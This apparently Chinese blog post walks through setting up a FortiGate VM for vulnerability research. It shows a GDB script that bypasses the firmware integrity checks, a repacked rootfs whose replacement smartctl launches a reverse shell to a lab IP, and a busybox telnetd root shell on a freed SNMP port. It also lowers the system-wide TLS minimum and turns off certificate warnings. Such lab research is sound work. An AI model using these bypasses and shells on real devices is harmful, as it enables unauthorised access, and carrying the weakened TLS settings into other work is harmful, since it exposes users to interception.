---
title: 'FortiGate 环境搭建'
date: 2023-06-12 14:51:14
category: setup
tags: [FortiGate]
published: true
hideInList: false
feature: 
isTop: false
---

## FortiGate 镜像下载

从官网下载`FortiGate`镜像，用`VMware`打开`ovf`（本文搭建时，`ForiGate`最新版本为`7.2.4`）

会得到`FortiGate-disk1.vmdk`、`FortiGate-disk2.vmdk`等一些文件

## 登录

在设置虚拟机网卡时，看别人都没做什么设置，我本地的设置是`网络适配器1`为`VMnet8(NAT)`、`网络适配器2`为`VMnet0`、`网络适配器3`为`VMnet1`

最初登录时用`admin: 空密码`，然后通过以下指令进行设置静态`ip`

```
config system interface
edit port1
set mode static
set ip 192.168.x.x/255.255.255.0
end
```

用`show system interface port1`查看`ip`设置

## 挂载 vmdk 

先安装`libguestfs-tools`

再通过`sudo virt-filesystems -a FortiGate-disk1.vmdk`分析`vmdk`的设备块，但是`Ubuntu20.04`及以上的版本均会报如下错

```
libguestfs: error: list_filesystems: sgdisk: Caution: invalid backup GPT header, but valid main header; regenerating
backup header from main header.

Warning! Main and backup partition tables differ! Use the 'c' and 'e' options
on the recovery & transformation menu to examine the two tables.

Warning! One or more CRCs don't match. You should repair the disk!
Main header: OK
Backup header: ERROR
Main partition table: OK
Backup partition table: ERROR

Invalid partition data!
```

如果用`Ubuntu18.04`不会报错，应该仅是`backup GPT header`不对，用`Ubuntu18.04`可以看到其设备块为`/dev/sda1 /dev/sda2 /dev/sda3`

不用查看设备块，直接挂载`/dev/sda1`也可，这里的`-m`是指的`vmdk`中的设备块，会挂载到当前目录的`FortiGate`目录中

```
sudo guestmount -a FortiGate-disk1.vmdk -m /dev/sda1 --rw ./FortiGate

Usage:
  guestmount [--options] mountpoint
Options:
  -a|--add image       Add image
  -m|--mount dev[:mnt[:opts[:fstype]] Mount dev on mnt (if omitted, /)
  -w|--rw              Mount read-write
```

挂载之后，可得到如下目录

```
bin   boot.msg  config         dhcpddb.bak         etc            filechecksum  flatkc.chk   ldlinux.sys  log         rootfs.gz
boot  cmdb      dhcp6s_db.bak  dhcp_ipmac.dat.bak  extlinux.conf  flatkc        ldlinux.c32  lib          lost+found  rootfs.gz.chk
```

其中比较重要就是`exlinux.conf`、`flatkc`、`flatkc.chk`、`rootfs.gz`、`rootfs.gz.chk`

```
vangelis@0x13:~/Desktop$ cat ./FortiGate-backup/extlinux.conf 
DISPLAY boot.msg
TIMEOUT 10
TOTALTIMEOUT 9000
DEFAULT flatkc ro panic=5 endbase=0xA0000 console=ttyS0, root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz maxcpus=1 mem=2048M
vangelis@0x13:~/Desktop$ file ./flatkc
./flatkc: Linux kernel x86 boot executable bzImage, version 4.19.13 (root@build) #1 SMP Tue Jan 31 05:32:20 UTC 2023, RO-rootFS, swap_dev 0x6, Normal VGA
```

### flatkc

使用[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)将`bzImage`转成`elf`，其主要在`fgt_verify`中检查`/sbin/init`和`/sbin/init.chk`是否匹配，只要修改`fgt_verify()`的返回值就可以绕过检测，走到`do_execve("/sbin/init")`

P.S 调试时看到的`rootfs.gz`应该是在`kernel_init_freeable`中调用`unpack_rootfs`

![flatkc-kernel-init](/img/FortiGate-Setup/flatkc-kernel-init.png)

### /sbin/init

主要`verify_filesystem`中验证所有的文件系统，后面解压`bin`、`migadmin`、`node-scripts`、`usr`，再`execve("/bin/init")`

![sbin-init](/img/FortiGate-Setup/sbin-init.png)

在`verify-filesystem`中`sub_401700`遍历所有的文件系统，然后算`hash`，最后跟`.fgtsum`的结果比较

![verify-filesystem](/img/FortiGate-Setup/verify-filesystem.png)

### /bin/init

`/bin/init`是`FortiGate`中核心功能，几乎所有的后台运行的程序均链接到`/bin/init`，在`main`中存在一些检测

![bin-init-main](/img/FortiGate-Setup/bin-init-main.png)

在`verifyKernelAndRootfs_450510()`的地方会验证`flatkc`和`rootfs`文件目录的结果

## 绕过

### 思路

最开始想的是，直接利用重打包`rootfs.gz`（注：这里`/dev/sda1`比较小，需要放到外面再重打包），调试虚拟机内核时修改`flatkc`中的指向`/sbin/init`的字符串为`/sh`，从而直接执行`busybox`的`sh`，结果不成功，可能是`/bin/init`中对于一些设备进行了初始化

于是还是得按照别人博客中的思路，重打包`rootfs.gz`，自己实现`/sbin/init`干的事情即解压文件，并把`/bin/busybox`丢进去；在调试内核的时候，修改`flatkc`的校验，使其不`panic`且修改其指向的字符串为`/bin/init`；执行`/bin/init`时修改验证的返回值，使其正常过检测

在重打包`rootfs.gz`的时候，修改`rootfs`中的`smartctl`的逻辑，通过 [reverse_shell](https://github.com/leommxj/prebuilt-multiarch-bin/blob/bin/x86_64_tools/reverse_shell) 反弹`shell`，然后通过`diagnose hardware smartctl`指令进行执行`smartctl`

```c
// gcc ./smartctl.c -static -o ./smartctl
#include <stdio.h>

void shell(){
    system("/bin/busybox ls", 0, 0);
    system("/bin/busybox id", 0, 0);
    system("/bin/reverse_shell 192.168.152.128 2333 && /bin/busybox id", 0, 0);
    return;
}

int main(int argc, char const *argv[])
{
    shell();
    return 0;
}
```

### 操作

首先给虚拟机的`vmx`加上如下语句，利用`debugStub`的特性对虚拟机进行调试，但是这个地方有个坑，就是如果用了`windows hyperV`就会在调试的时候跑飞，完全断不下来，[debugStub does not work on Windows 10 2004 with Hyper-V](https://communities.vmware.com/t5/VMware-Workstation-Pro/debugStub-does-not-work-on-Windows-10-2004-with-Hyper-V/td-p/1868359)

```
debugStub.listen.guest64 = "TRUE"
debugStub.listen.guest64.remote = "TRUE"
debugStub.port.guest64 = "12345"
debugStub.listen.guest32 = "TRUE"
debugStub.listen.guest32.remote = "TRUE"
debugStub.port.guest32 = "12346"
toolsInstallManager.updateCounter = "2"
tools.remindInstall = "FALSE"
```

解压`rootfs`，直接用`cpio -idmv < ../rootfs`

解压的时候`xz`为其自己实现的，因此要用如下指令，将压缩的全部解压

```
chroot . /sbin/xz -d usr.tar.xz
chroot . /sbin/ftar -xf ./usr.tar
```

重打包的指令如下

```
find . | cpio -o --format=newc > rootfs 
gzip rootfs

guestmount -a FortiGate-disk1.vmdk -m /dev/sda1 --rw ./FortiGate 
cd FortiGate
cp ../xxx/rootfs.gz ./
cd ..
umount FortiGate
```

在开启`FortiGate`之后出现如下字样后，进行远程调试，断在`fgt_verify()`的返回，修改其返回值，并修改其字符串为`/bin/init\x00`，然后再在`/bin/init`中下断点（其实这个地方，从内核层面给用户态的一个进程下断点，没太搞懂），修改返回值，就可以成功绕过检测了

建议使用裸`gdb`

```
Loading flatkc... ok
Loading rootfs.gz... ok
```

以下是写的一个`script`（注意这里`debugStub`起的是主机的端口）

```
file ./flatkc-elf
target remote 192.168.152.1:12345
b *0xffffffff80c022db
# b *0xffffffff80c0231a
b *0x452BAC
b *0x452DF3 
b *0x452BC6
c

define context
  i r
  x/10i $pc
end

define bypass
   set $rax=0
   patch
   c
end

define patch
  context
  set *(char*)0xFFFFFFFF813B779D='b'
  set *(char*)0xFFFFFFFF813B779E='i'
  set *(char*)0xFFFFFFFF813B779F='n'
  set *(char*)0xFFFFFFFF813B77A0='/'
  set *(char*)0xFFFFFFFF813B77A1='i'
  set *(char*)0xFFFFFFFF813B77A2='n'
  set *(char*)0xFFFFFFFF813B77A3='i'
  set *(char*)0xFFFFFFFF813B77A4='t'
  set *(char*)0xFFFFFFFF813B77A5='\x00'
  x/s 0xFFFFFFFF813B779C
end
```

## 开启telnetd

在开启`telnetd`的地方，在`7.2.4`的版本上，应该存在较大的改动，`killall -9 sshd`之后会立刻重启，基本上没成功的用`telnetd`占上`22`端口，其他的端口也被墙了，最后在`ZOE`大佬的帮助下，利用开启`snmp`服务，然后发现并没有检测`kill snmpd`，因此可以直接利用`snmp`被`kill`掉的`161`和`162`端口，进行开启`telnet`和`gdbserver`转发

就是在`Network/interfaces`中，修改`port1`，把`snmp`打开

```
killall -9 snmpd && /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 162
/bin/gdbserver --attach 127.0.0.1:161 sslvpndPid
```

如果逆向到后面，可以找到`/bin/init`中的`sshd`的`Service`注册的位置，把注册的位置改成`while(1)`，同样也是可以`kill sshd`，占用`22`端口开启`telnetd`服务的

## 配置ip

[官方文档](https://help.fortinet.com/fdb/5-0-0/html/source/tasks/t_network_configuration_cli.html)

```
config system interface
  edit <port>
  set ip <ip_address> <netmask>
  set allowaccess (http https ping ssh telnet)
end
```

## python3 tlsv1 报错

用`python3`写`SSL`连接时报错如下

```
  File "/usr/lib/python3.8/ssl.py", line 500, in wrap_socket
    return self.sslsocket_class._create(
  File "/usr/lib/python3.8/ssl.py", line 1040, in _create
    self.do_handshake()
  File "/usr/lib/python3.8/ssl.py", line 1309, in do_handshake
    self._sslobj.do_handshake()
ssl.SSLError: [SSL: TLSV1_ALERT_PROTOCOL_VERSION] tlsv1 alert protocol version (_ssl.c:1131)
```

是因为`ubuntu 20.04`最低的`tls`版本设置高于`tlsv1`，因此需要修改`/etc/ssl/openssl.cnf`的配置

需要在文件第一行加上`openssl_conf = default_conf`

文件尾再加上

```
[default_conf]
ssl_conf = ssl_sect

[ssl_sect]
system_default = system_default_sect

[system_default_sect]
MinProtocol = TLSv1
CipherString = DEFAULT@SECLEVEL=1
```

如果想要`requests`不报`warning`，需要加上如下代码在`python3`脚本中

```
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
```

这部分的报错解决很久，最后是在[ubuntu 20.04启用TLSv1](https://blog.csdn.net/weixin_44338780/article/details/117912301)找到的


## 引用

> https://forum.butian.net/share/2166
> https://wzt.ac.cn/2022/12/15/CVE-2022-42475/